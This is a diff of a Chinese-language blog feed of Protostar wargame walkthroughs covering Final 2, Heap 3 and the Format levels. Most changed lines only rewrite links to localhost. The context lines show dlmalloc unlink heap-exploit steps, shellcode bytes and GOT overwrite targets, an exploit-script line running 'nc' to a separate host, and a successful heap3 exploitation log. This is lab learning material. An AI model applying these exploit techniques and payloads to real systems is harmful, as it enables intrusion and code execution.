+&lt;p&gt;&lt;em&gt;&lt;strong&gt;关于 dlmalloc 的 unlink trick，全部已经移动到了这里：&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/old_dlmalloc_unlink_tricks&#34; &gt;Old Dlmalloc Unlink Tricks&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;&lt;strong&gt;请看完那篇后再继续向下看&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;br&gt;
 &lt;hr&gt;
@@ -2671,7 +3635,7 @@ realpath - return the canonicalized absolute pathname&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;由于 REQSZ 设定为 128，大于 80 所以不会使用 fastbin&lt;/p&gt;
-&lt;p&gt;由于先释放的是 chunkA，那么就利用到了 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;/p/old_dlmalloc_unlink_tricks/#trick-use-negative-size&#34; &gt;Trick: use negative size&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 中的 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;/p/old_dlmalloc_unlink_tricks/#next-chunks-nexts-prev_inuse&#34; &gt;next chunk’s next’s PREV_INUSE&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 章节&lt;/p&gt;
+&lt;p&gt;由于先释放的是 chunkA，那么就利用到了 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/old_dlmalloc_unlink_tricks/#trick-use-negative-size&#34; &gt;Trick: use negative size&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 中的 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/old_dlmalloc_unlink_tricks/#next-chunks-nexts-prev_inuse&#34; &gt;next chunk’s next’s PREV_INUSE&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 章节&lt;/p&gt;
 &lt;p&gt;建议先看完再继续&lt;/p&gt;
 &lt;p&gt;直接说结论的话，我们只要把 chunkB 的 size 覆盖为 &lt;code&gt;0xfffffffc = -0x4&lt;/code&gt; 就能满足第三个条件&lt;/p&gt;
 &lt;p&gt;另外，prev_size 也会被覆盖，为了区分就使用 &lt;code&gt;0xfffffff8 = -0x8&lt;/code&gt; 好了&lt;/p&gt;
@@ -2700,7 +3664,7 @@ realpath - return the canonicalized absolute pathname&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0804d41c R_386_JUMP_SLOT   write
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0804d468 R_386_JUMP_SLOT   fwrite
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:~$
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;套用 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;/p/dlmalloc_unlink_vuln/#vulnerability-unlink&#34; &gt;Vulnerability: unlink&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 中的公式：&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;套用 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/dlmalloc_unlink_vuln/#vulnerability-unlink&#34; &gt;Vulnerability: unlink&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 中的公式：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;令 fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; addr of write - 0xc
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;令 bk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; addr of shllcode
@@ -2773,10 +3737,10 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            -8|  -4|  fd|  bk
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;implement&#34;&gt;Implement&lt;/h2&gt;
 &lt;p&gt;最终的思路画成图：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_final_2/buf.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_final_2/buf.png&#34;
 	width=&#34;2254&#34;
 	height=&#34;1290&#34;
-	srcset=&#34;/p/protostar_final_2/buf_hu80e7e3cc8859acb7f205acbcb4252b1a_374163_480x0_resize_box_3.png 480w, /p/protostar_final_2/buf_hu80e7e3cc8859acb7f205acbcb4252b1a_374163_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_final_2/buf_hu80e7e3cc8859acb7f205acbcb4252b1a_374163_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_final_2/buf_hu80e7e3cc8859acb7f205acbcb4252b1a_374163_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;buf.png&#34;
@@ -2824,10 +3788,10 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nc -v 192.168.215.129 31337&amp;#34;&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/protostar_final_2/host.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_final_2/host.png&#34;
 	width=&#34;2880&#34;
 	height=&#34;1298&#34;
-	srcset=&#34;/p/protostar_final_2/host_huda532a72d9d7373fdbec5063b9126966_1315940_480x0_resize_box_3.png 480w, /p/protostar_final_2/host_huda532a72d9d7373fdbec5063b9126966_1315940_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_final_2/host_huda532a72d9d7373fdbec5063b9126966_1315940_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_final_2/host_huda532a72d9d7373fdbec5063b9126966_1315940_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;宿主机&#34;
@@ -2838,10 +3802,10 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 		data-flex-basis=&#34;532px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_final_2/virtual.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_final_2/virtual.png&#34;
 	width=&#34;2880&#34;
 	height=&#34;906&#34;
-	srcset=&#34;/p/protostar_final_2/virtual_hud37b339a6bc688fa6b63b77645e1d796_919506_480x0_resize_box_3.png 480w, /p/protostar_final_2/virtual_hud37b339a6bc688fa6b63b77645e1d796_919506_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_final_2/virtual_hud37b339a6bc688fa6b63b77645e1d796_919506_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_final_2/virtual_hud37b339a6bc688fa6b63b77645e1d796_919506_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;虚拟机&#34;
@@ -2868,11 +3832,11 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
         </item>
         <item>
         <title>Protostar Heap 3 Walkthrough</title>
-        <link>/p/protostar_heap_3/</link>
+        <link>//localhost:1313/p/protostar_heap_3/</link>
         <pubDate>Thu, 07 Apr 2022 00:00:00 +0000</pubDate>
         
-        <guid>/p/protostar_heap_3/</guid>
-        <description>&lt;img src="/p/protostar_heap_3/cover.png" alt="Featured image of post Protostar Heap 3 Walkthrough" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        <guid>//localhost:1313/p/protostar_heap_3/</guid>
+        <description>&lt;img src="//localhost:1313/p/protostar_heap_3/cover.png" alt="Featured image of post Protostar Heap 3 Walkthrough" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;☞ 最终的 Ruby 脚本放在了这里&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://phrack.org/issues/57/9.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
@@ -2923,7 +3887,7 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 &lt;p&gt;我们的目标是把 &lt;code&gt;puts()&lt;/code&gt; 在动态链接表中记录的地址，写上能跳转到 &lt;code&gt;winner()&lt;/code&gt; 的 shellcode&lt;/p&gt;
 &lt;p&gt;而能帮我们达到以上目的的函数就是 &lt;code&gt;free()&lt;/code&gt;， 准确来说是 &lt;code&gt;unlink()&lt;/code&gt;&lt;/p&gt;
 &lt;br&gt;
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;关于 dlmalloc 的 unlink trick，全部已经移动到了这里：&lt;a class=&#34;link&#34; href=&#34;/p/old_dlmalloc_unlink_tricks&#34; &gt;Old Dlmalloc Unlink Tricks&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;关于 dlmalloc 的 unlink trick，全部已经移动到了这里：&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/old_dlmalloc_unlink_tricks&#34; &gt;Old Dlmalloc Unlink Tricks&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;br&gt;
 &lt;p&gt;如果你看完了那篇，那么再结合一下这道题目，&lt;/p&gt;
 &lt;p&gt;heap3 首先依次创建了 chunkA, chunkB, chunkC 然后再反过来依次释放 chunkC, chunkB, chunkA&lt;/p&gt;
@@ -2941,16 +3905,16 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 &lt;p&gt;=&amp;gt; 会对 &lt;em&gt;Chunk&lt;/em&gt; 的 &lt;em&gt;相邻上一个 chunk&lt;/em&gt; 执行 &lt;code&gt;unlink()&lt;/code&gt;&lt;br&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;由于题目中的 &lt;code&gt;malloc()&lt;/code&gt; 大小是 &lt;em&gt;32&lt;/em&gt;，小于 &lt;em&gt;80&lt;/em&gt; 所以会使用 fastbin 结构，所以可以通过上面那篇文章的 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;/p/old_dlmalloc_unlink_tricks/#trick-use-negative-size&#34; &gt;Trick: use negative size&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 章节，使用一个负数：&lt;code&gt;0xfffffffc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;由于题目中的 &lt;code&gt;malloc()&lt;/code&gt; 大小是 &lt;em&gt;32&lt;/em&gt;，小于 &lt;em&gt;80&lt;/em&gt; 所以会使用 fastbin 结构，所以可以通过上面那篇文章的 &lt;em&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/old_dlmalloc_unlink_tricks/#trick-use-negative-size&#34; &gt;Trick: use negative size&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt; 章节，使用一个负数：&lt;code&gt;0xfffffffc&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;那么将 size 设置为 &lt;code&gt;0xfffffffc = -4&lt;/code&gt; 就可以满足第一个条件&lt;/p&gt;
 &lt;p&gt;但是，如果我们是使用 BufferOverFlow 的方式，从 chunkA 开始去覆写 chunkB 的 size 的话，会导致 prev_size 也被覆盖上，&lt;/p&gt;
 &lt;p&gt;而且，既然是「向前 &lt;code&gt;unlink()&lt;/code&gt;」，那么 malloc 计算上一个 chunk 的方式是 &lt;code&gt;p - prev_size&lt;/code&gt;；如果 prev_size 是乱七八糟的数值，必定会导致 Segmentation fault&lt;/p&gt;
 &lt;p&gt;这时候可以再用一次负数，为了区分，就使用 &lt;code&gt;0xfffffff8 = -8&lt;/code&gt; 好了：而这样做的效果是，&lt;code&gt;p - prev_size&lt;/code&gt; = &lt;code&gt;p - -8&lt;/code&gt; = &lt;code&gt;p + 8&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;也就是说，&lt;em&gt;p&lt;/em&gt; 的 &lt;em&gt;prevchunk&lt;/em&gt; 出现在了 &lt;em&gt;p&lt;/em&gt; 的向后 0x8 的位置：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/fakechunk.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_heap_3/fakechunk.png&#34;
 	width=&#34;1924&#34;
 	height=&#34;1146&#34;
-	srcset=&#34;/p/protostar_heap_3/fakechunk_hu4b5995100df9f5937e7253e1e38c07ff_299953_480x0_resize_box_3.png 480w, /p/protostar_heap_3/fakechunk_hu4b5995100df9f5937e7253e1e38c07ff_299953_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_heap_3/fakechunk_hu4b5995100df9f5937e7253e1e38c07ff_299953_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_heap_3/fakechunk_hu4b5995100df9f5937e7253e1e38c07ff_299953_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;fakechunk.png&#34;
@@ -3001,10 +3965,10 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Assembly - Little Endian&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\x68\x64\x88\x04\x08\xc3&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后，直接可以画出这张图了：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/fakechunk_after.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_heap_3/fakechunk_after.png&#34;
 	width=&#34;1924&#34;
 	height=&#34;1146&#34;
-	srcset=&#34;/p/protostar_heap_3/fakechunk_after_hu4b5995100df9f5937e7253e1e38c07ff_340708_480x0_resize_box_3.png 480w, /p/protostar_heap_3/fakechunk_after_hu4b5995100df9f5937e7253e1e38c07ff_340708_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_heap_3/fakechunk_after_hu4b5995100df9f5937e7253e1e38c07ff_340708_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_heap_3/fakechunk_after_hu4b5995100df9f5937e7253e1e38c07ff_340708_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;fakechunk_after.png&#34;
@@ -3120,10 +4084,10 @@ The memmove() function copies &lt;code&gt;n&lt;/code&gt; bytes from memory area 
 bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;这时候就又要请出 NOP 了&amp;hellip;我们直接把 &lt;code&gt;0x804c008&lt;/code&gt; 到 &lt;code&gt;0x804c010&lt;/code&gt; 全写上 NOP 就好了&amp;hellip;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/nop.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_heap_3/nop.png&#34;
 	width=&#34;1504&#34;
 	height=&#34;316&#34;
-	srcset=&#34;/p/protostar_heap_3/nop_hu38fa74e4de6e6b5568a8adfa2db215b5_236731_480x0_resize_box_3.png 480w, /p/protostar_heap_3/nop_hu38fa74e4de6e6b5568a8adfa2db215b5_236731_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_heap_3/nop_hu38fa74e4de6e6b5568a8adfa2db215b5_236731_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_heap_3/nop_hu38fa74e4de6e6b5568a8adfa2db215b5_236731_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;nop&#34;
@@ -3148,10 +4112,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;p&gt;但下次果然还是应该多考虑一下&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;那么重新画一下图，就是这样：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/true.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_heap_3/true.png&#34;
 	width=&#34;1922&#34;
 	height=&#34;1216&#34;
-	srcset=&#34;/p/protostar_heap_3/true_hu33ba29c7aa64820a9e6eed409716edae_351944_480x0_resize_box_3.png 480w, /p/protostar_heap_3/true_hu33ba29c7aa64820a9e6eed409716edae_351944_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_heap_3/true_hu33ba29c7aa64820a9e6eed409716edae_351944_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_heap_3/true_hu33ba29c7aa64820a9e6eed409716edae_351944_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;true&#34;
@@ -3169,10 +4133,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ /opt/protostar/bin/heap3 &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;cat /tmp/A&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;cat /tmp/B&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt; ABCD
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;that wasn&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t too bad now, was it? @ &lt;span style=&#34;color:#ae81ff&#34;&gt;1648020034&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/protostar_heap_3/finally.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_heap_3/finally.png&#34;
 	width=&#34;2678&#34;
 	height=&#34;630&#34;
-	srcset=&#34;/p/protostar_heap_3/finally_hu76fcd66edf669116a552bbca9c3c1384_523547_480x0_resize_box_3.png 480w, /p/protostar_heap_3/finally_hu76fcd66edf669116a552bbca9c3c1384_523547_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_heap_3/finally_hu76fcd66edf669116a552bbca9c3c1384_523547_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_heap_3/finally_hu76fcd66edf669116a552bbca9c3c1384_523547_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;end&#34;
@@ -3204,11 +4168,11 @@ bk + 0x8 = addr of puts&lt;/p&gt;
         </item>
         <item>
         <title>格式，参数，红宝石</title>
-        <link>/p/protostar_format_1/</link>
+        <link>//localhost:1313/p/protostar_format_1/</link>
         <pubDate>Thu, 31 Mar 2022 00:00:00 +0000</pubDate>
         
-        <guid>/p/protostar_format_1/</guid>
-        <description>&lt;img src="/p/protostar_format_1/cover.png" alt="Featured image of post 格式，参数，红宝石" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        <guid>//localhost:1313/p/protostar_format_1/</guid>
+        <description>&lt;img src="//localhost:1313/p/protostar_format_1/cover.png" alt="Featured image of post 格式，参数，红宝石" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;☞ 最终的 Ruby 脚本放在了这里&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;format-one&#34;&gt;Format One&lt;/h2&gt;
@@ -3361,10 +4325,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;p&gt;那为什么不在打印了 131 个 &lt;code&gt;%p&lt;/code&gt; 后就停下来呢&amp;hellip;&lt;/p&gt;
 &lt;p&gt;幸好每次增加一个 &lt;code&gt;%p&lt;/code&gt; 的结果都有输出，让我们往上翻看一下 131 个 &lt;code&gt;%p&lt;/code&gt; 时是什么情况&amp;hellip;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;......0x69622f720x6f662f6e0x74616d720x42410031
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/protostar_format_1/132p.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_format_1/132p.png&#34;
 	width=&#34;730&#34;
 	height=&#34;550&#34;
-	srcset=&#34;/p/protostar_format_1/132p_hu22c200dd66b92826f0391685ed4f4dda_339838_480x0_resize_box_3.png 480w, /p/protostar_format_1/132p_hu22c200dd66b92826f0391685ed4f4dda_339838_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_format_1/132p_hu22c200dd66b92826f0391685ed4f4dda_339838_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_format_1/132p_hu22c200dd66b92826f0391685ed4f4dda_339838_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -3562,7 +4526,7 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;p&gt;那 EBP 是什么呢？&lt;/p&gt;
 &lt;p&gt;我们可以看到在 &lt;code&gt;main()&lt;/code&gt; 的汇编代码的第一行出现了 &lt;code&gt;0x0804841c &amp;lt;main+0&amp;gt;:	push ebp&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;而这里的 EBP 就是 &lt;code&gt;main&lt;/code&gt; 函数在栈中开始读写数据的位置&lt;/p&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;/p/protostar_stack_4-7&#34; &gt;☞ 建议看看这些&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;//localhost:1313/p/protostar_stack_4-7&#34; &gt;☞ 建议看看这些&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;推测有那么一个 16 bytes 的 buffer，每当 buffer 塞满时，主程序所占的栈空间就整体下移 16 bytes，具体体现在 EBP 减小了 16&lt;/p&gt;
 &lt;p&gt;至于原因&amp;hellip;？类似硬盘的 4K 对齐？&lt;/p&gt;
 &lt;p&gt;总之这就是为什么我们用 &lt;code&gt;%p&lt;/code&gt; 来打印 4 bytes 时 44434241 无法出现在同一个 &lt;code&gt;%p&lt;/code&gt; 内的原因，毕竟每次参数长度的改变都会改变&lt;code&gt;argv[1]&lt;/code&gt; 的地址&lt;/p&gt;
@@ -3624,10 +4588,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;puts &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; exec: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;command&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;puts &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;command&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;/p/protostar_format_1/end.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_format_1/end.png&#34;
 	width=&#34;2874&#34;
 	height=&#34;1162&#34;
-	srcset=&#34;/p/protostar_format_1/end_hu9ef32b8fa10ca82178df17d983a445db_1922672_480x0_resize_box_3.png 480w, /p/protostar_format_1/end_hu9ef32b8fa10ca82178df17d983a445db_1922672_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;//localhost:1313/p/protostar_format_1/end_hu9ef32b8fa10ca82178df17d983a445db_1922672_480x0_resize_box_3.png 480w, //localhost:1313/p/protostar_format_1/end_hu9ef32b8fa10ca82178df17d983a445db_1922672_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -3641,10 +4605,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
         </item>
         <item>
         <title>Protostar Format 0-4 Walkthrough</title>
-        <link>/p/protostar_format_0-4/</link>
+        <link>//localhost:1313/p/protostar_format_0-4/</link>
         <pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate>
         
-        <guid>/p/protostar_format_0-4/</guid>
+        <guid>//localhost:1313/p/protostar_format_0-4/</guid>
         <description>&lt;p&gt;所有的 ruby 脚本已经放在了&lt;a class=&#34;link&#34; href=&#34;https://github.com/KurusuSenri/protostar_solutions&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;这里&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
@@ -3711,10 +4675,10 @@ bk + 0x8 = addr of puts&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;puts &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;command&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;唯一需要说明的就是 &lt;code&gt;%64d&lt;/code&gt; 的作用是对 &lt;code&gt;char buffer[64]&lt;/code&gt; 填充 64 个空格进行占位&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/p/protostar_format_0-4/0.png&#34;
+&lt;p&gt;&lt;img src=&#34;//localhost:1313/p/protostar_format_0-4/0.png&#34;
 	width=&#34;1990&#34;
 	height=&#34;624&#34;
